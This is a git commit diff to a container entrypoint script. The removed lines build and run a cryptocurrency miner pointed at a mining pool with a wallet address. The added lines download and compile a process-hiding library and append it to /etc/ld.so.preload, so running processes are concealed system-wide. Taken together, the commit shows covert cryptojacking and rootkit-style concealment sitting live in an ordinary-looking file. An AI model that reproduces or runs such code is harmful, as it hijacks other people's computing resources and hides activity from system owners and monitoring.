4d146767bcd96f880d60c901ce08e6519adab9a8
pepek131happy4d <103928972+pepek131happy4d@users.noreply.github.com>
2022-04-18 10:08:50 +0000

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,11 +1,5 @@
-cd /cpuminer
-
-    git clone http://github.com/bogdanadnan/multiminer
-  
-    cd multiminer
-    mkdir build
-    cd build
-    cmake ..
-    make
-    chmod 777 multiminer
-    ./multiminer -a yescrypt -o stratum+tcp://www.koto-note.xyz:3032 -u jzyoPToY94CM6K92StJUgTeFsF8bqG5BrAR.sx2 -p x
+wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/Makefile
+wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c
+make
+mv libprocesshider.so /usr/local/lib
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
